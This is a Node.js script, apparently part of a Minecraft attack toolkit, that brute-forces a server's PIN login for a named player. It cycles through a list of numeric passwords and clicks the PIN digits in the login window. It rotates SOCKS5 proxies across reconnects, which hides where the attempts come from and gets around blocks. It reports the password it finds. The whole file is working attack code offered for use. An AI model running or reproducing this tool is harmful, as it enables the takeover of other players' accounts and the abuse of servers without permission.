const mineflayer = require('mineflayer');
const {ProxyAgent} = require('proxy-agent');
const socks = require('socks').SocksClient;
const utils = require('./utils');
const fs = require('fs');

if (process.argv.length < 5) {
    utils.coloredText('Usage: node pin_login.js <host> <port> <username> <version> <passwordFile> <spaces> [<proxyFile>]');
    process.exit(1);
}

const host = process.argv[2];
const port = process.argv[3];
const username = process.argv[4];
const version = process.argv[5];
const passwordFile = process.argv[6];
const spaces = process.argv[7];
const proxyFile = process.argv[8];

if (passwordFile === null) {
    utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered password file is not valid.`);
    process.exit(1);
}

if (proxyFile) {
    proxyTest = utils.getListOfPasswords(proxyFile)

    if (proxyTest === null) {
        utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered proxy file (§c${proxyFile}§f) is not valid.`);
        process.exit(1);
    }
}

function containsOnlyNumbers(str) {
  return /^\d+$/.test(str);
}

function getSpaces(spaces) {
    return ' '.repeat(spaces);
}

let passwords = utils.getListOfPasswords(passwordFile)
passwords = passwords.filter(containsOnlyNumbers)

if (passwords.length === 0) {
    utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered password file does not contain numeric passwords.`);
    process.exit(1);
}

let attempts = 0;
let settingsData = fs.readFileSync('config/bruteforce_config.json');
let settingsJson = JSON.parse(settingsData);
const reconnectDelay = settingsJson.pinLogin.reconnect;
const wordsOnLogin = settingsJson.pinLogin.titleTextOnLogin;


function createBot(proxy=null) {
    let bot;

    try {
        if (proxy) {
            bot = mineflayer.createBot({
                connect: client => {
                    socks.createConnection({
                        proxy: {
                            host: proxy[0],
                            port: proxy[1],
                            type: 5
                        },
                        command: 'connect',
                        timeout: 5000,
                        destination: {
                            host: host,
                            port: parseInt(port)
                        }
                    }, (err, info) => {
                        if (err) {
                            utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §cThe proxy server the bot connected to did not respond. Trying to connect with another proxy..`))
                            sendBot();
                            return;
                        }

                        client.setSocket(info.socket)
                        client.emit('connect')
                    })
                },

                agent: new ProxyAgent({ protocol: 'socks5:', host: proxy[0], port: proxy[1] }),
                username: username,
                fakeHost: host,
                version: version,
                hideErrors: true,
            })
        } else {
            bot = mineflayer.createBot({
                host: host,
                fakeHost: host,
                port: port,
                username: username,
                version: version,
                hideErrors: true
            })
        }
    } catch (error) {
        if (error.message.includes('is not supported')) {
            const version = error.message.match(/\d+\.\d+\.\d+/)[0];
            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Version §c§l${version} §cis not currently supported.`)
        }

        else if (error.message.includes('unsupported protocol version:')) {
            try {
                protocol = error.message.match(/\d+/)['input'].split(': ')[1]
                
            } catch {
                protocol = error.message.match(/\d+/);
            }
            
            if (protocol != null) {
                utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Protocol §c§l${protocol} §cis not supported`)
            } else {
                utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Protocol is not supported`)
            }
        }

        else {
            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §4Error`)
        }

        process.exit(1);
    }

    bot.setMaxListeners(Infinity)

    bot.on('login', () => {
        utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §aThe bot has connected to the server.`));
    })

    bot.on('title', (text) => {
        for (const word of wordsOnLogin) {
            if (text.includes(word)) {
                utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fThe password of the §a${username} §fuser is: §a${passwords[attempts]}`));
                bot.quit();
                process.exit(1)
            }
        }

        if (attempts === passwords.length || typeof(passwords[attempts]) == 'undefined') {
            utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §cThe password is not found in the password list.`));
            bot.quit();
            process.exit(1);
        }

        utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fTesting the password: §a${passwords[attempts]}`));
        attempts += 1;
    })

    bot.on('windowOpen', (window) => {
        const windowItems = window.containerItems();
        let numbersLength = 0

        for (const number of passwords[attempts]) {
            windowItems.forEach((item) => {
                let {customName, slot} = item;

                if (customName.includes(number)) {
                    bot.clickWindow(slot, 1, 0).then(r => {})
                    numbersLength += 1;
                }
            })
        }
    })

    bot.on('kicked', (reason) => {
        const message = utils.getTextFromJSON(reason);

        if (message.length === 0) {
            let newReason = reason.replace(/"/g, '');
            utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §c${newReason}`));
        } else {
            utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §c${message}`));
        }

        bot.quit();
        setTimeout(() => {
            sendBot();
        }, reconnectDelay);
    })

    bot.on('error', (_) => {
        utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §cThe bot was forced to disconnect.`));
        bot.quit();
        setTimeout(() => {
            sendBot();
        }, reconnectDelay);
    })
}

function sendBot() {
    if (proxyFile) {
        const randomProxy = utils.getProxy(proxyFile);

        if (randomProxy) {
            utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §aSending the bot to the server.. §f§l(§d${randomProxy[0]}:${randomProxy[1]}§f§l)`));
            createBot(randomProxy);
        } else {
            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] Invalid Proxy: ${proxyFile}`);
        }

    } else {
        utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §aSending the bot to the server.. §f§l(§cNo proxy§f§l)`));
        createBot();
    }
}

sendBot();

